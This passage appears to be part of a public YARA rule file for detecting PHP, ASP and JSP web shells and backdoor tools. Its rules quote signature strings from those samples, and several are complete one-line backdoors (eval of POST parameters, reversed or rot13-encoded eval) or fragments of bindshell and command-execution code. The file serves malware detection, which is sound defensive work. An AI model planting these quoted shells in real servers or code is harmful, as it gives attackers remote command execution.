		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"
	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
	condition:
		2 of them
}

rule webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "4745d510fed4378e4b1730f56f25e569"
		hash2 = "f3ca29b7999643507081caab926e2e74"
		hash3 = "46a18979750fa458a04343cf58faa9bd"
	strings:
		$s3 = "BODY, TD, TR {" fullword
		$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
		$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
	condition:
		2 of them
}

rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword
	condition:
		4 of them
}

rule webshell_2_520_icesword_job_ma1 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
	condition:
		2 of them
}

rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword
	condition:
		all of them
}

rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword
	condition:
		2 of them
}

rule webshell_c99_locus7s_c99_w4cking_xxx {
	meta:
		description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword
	condition:
		2 of them
}

rule webshell_browser_201_3_ma_ma2_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
	condition:
		2 of them
}

rule webshell_000_403_c5_queryDong_spyjsp2010 {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
	condition:
		2 of them
}

rule webshell_r57shell127_r57_kartal_r57 {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
	condition:
		2 of them
}

rule webshell_webshells_new_con2 {
	meta:
		description = "Web shells - generated from file con2.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "d3584159ab299d546bd77c9654932ae3"
	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
	condition:
		1 of them
}

rule webshell_webshells_new_make2 {
	meta:
		description = "Web shells - generated from file make2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		hash = "9af195491101e0816a263c106e4c145e"
		score = 50
	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
	condition:
		all of them
}

rule webshell_webshells_new_aaa {
	meta:
		description = "Web shells - generated from file aaa.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "68483788ab171a155db5266310c852b2"
	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
	condition:
		1 of them
}

rule webshell_Expdoor_com_ASP {
	meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "caef01bb8906d909f24d1fa109ea18a7"
	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword
	condition:
		2 of them
}

rule webshell_webshells_new_php2 {
	meta:
		description = "Web shells - generated from file php2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "fbf2e76e6f897f6f42b896c855069276"
	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
	condition:
		all of them
}

rule webshell_bypass_iisuser_p {
	meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "924d294400a64fa888a79316fb3ccd90"
	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
	condition:
		all of them
}

rule webshell_sig_404super {
	meta:
		description = "Web shells - generated from file 404super.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "7ed63176226f83d36dce47ce82507b28"
	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
	condition:
		1 of them
}

rule webshell_webshells_new_JSP {
	meta:
		description = "Web shells - generated from file JSP.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
	strings:
		$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
		$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
		$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
	condition:
		1 of them
}

rule webshell_webshell_123 {
	meta:
		description = "Web shells - generated from file webshell-123.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "2782bb170acaed3829ea9a04f0ac7218"
	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/" fullword
	condition:
		2 of them
}

rule webshell_dev_core {
	meta:
		description = "Web shells - generated from file dev_core.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "55ad9309b006884f660c41e53150fc2e"
	strings:
		$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
		$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
		$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
		$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
		$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
		$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
	condition:
		1 of them
}

rule webshell_webshells_new_pHp {
	meta:
		description = "Web shells - generated from file pHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
	condition:
		1 of them
}

rule webshell_webshells_new_pppp {
	meta:
		description = "Web shells - generated from file pppp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf01cb6e09ee594545693c5d327bdd50"
	strings:
		$s0 = "Mail: chinese@hackermail.com" fullword
		$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
		$s6 = "Site: http://blog.weili.me" fullword
	condition:
		1 of them
}

rule webshell_webshells_new_code {
	meta:
		description = "Web shells - generated from file code.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a444014c134ff24c0be5a05c02b81a79"
	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
	condition:
		1 of them
}

rule webshell_webshells_new_jspyyy {
	meta:
		description = "Web shells - generated from file jspyyy.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
	condition:
		all of them
}

rule webshell_webshells_new_xxxx {
	meta:
		description = "Web shells - generated from file xxxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword
	condition:
		all of them
}

rule webshell_webshells_new_JJjsp3 {
	meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "949ffee1e07a1269df7c69b9722d293e"
	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
	condition:
		all of them
}

rule webshell_webshells_new_PHP1 {
	meta:
		description = "Web shells - generated from file PHP1.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
	strings:
		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
	condition:
		1 of them
}

rule webshell_webshells_new_JJJsp2 {
	meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5a9fec45236768069c99f0bfd566d754"
	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
	condition:
		1 of them
}

rule webshell_webshells_new_radhat {
	meta:
		description = "Web shells - generated from file radhat.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "72cb5ef226834ed791144abaa0acdfd4"
	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"
	condition:
		all of them
}

rule webshell_webshells_new_asp1 {
	meta:
		description = "Web shells - generated from file asp1.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b63e708cd58ae1ec85cf784060b69cad"
	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
	condition:
		1 of them
}

rule webshell_webshells_new_php6 {
	meta:
		description = "Web shells - generated from file php6.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "ea75280224a735f1e445d244acdfeb7b"
	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword
	condition:
		1 of them
}

rule webshell_webshells_new_xxx {
	meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
	condition:
		all of them
}

rule webshell_GetPostpHp {
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "20ede5b8182d952728d594e6f2bb5c76"
	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
	condition:
		all of them
}

rule webshell_webshells_new_php5 {
	meta:
		description = "Web shells - generated from file php5.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
	condition:
		all of them
}

rule webshell_webshells_new_PHP {
	meta:
		description = "Web shells - generated from file PHP.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
	strings:
		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
		$s5 = " - ExpDoor.com</title>" fullword
		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
	condition:
		1 of them
}

rule webshell_webshells_new_Asp {
	meta:
		description = "Web shells - generated from file Asp.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "32c87744ea404d0ea0debd55915010b7"
	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
	condition:
		1 of them
}

/* Update from hackers tool pack */

rule perlbot_pl {
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"
	condition:
		1 of them
}

rule php_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"
	condition:
		1 of them
}

rule Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
	condition:
		1 of them
}

rule Nshell__1__php_php {
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "973fc89694097a41e684b43a21b1b099"
	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
	condition:
		1 of them
}

rule shankar_php_php {
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
	condition:
		1 of ($s*) and $sAuthor
}

rule Casus15_php_php {
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "
	condition:
		1 of them
}

rule small_php_php {
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword
	condition:
		2 of them
}

rule shellbot_pl {
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
	condition:
		2 of them
}

rule fuckphpshell_php {
	meta:
		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "554e50c1265bb0934fcc8247ec3b9052"
	strings:
		$s0 = "$succ = \"Warning! "
		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
		$s2 = "\\*=-- MEMBERS AREA --=*/"
		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
	condition:
		2 of them
}

rule ngh_php_php {
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
	condition:
		1 of them
}
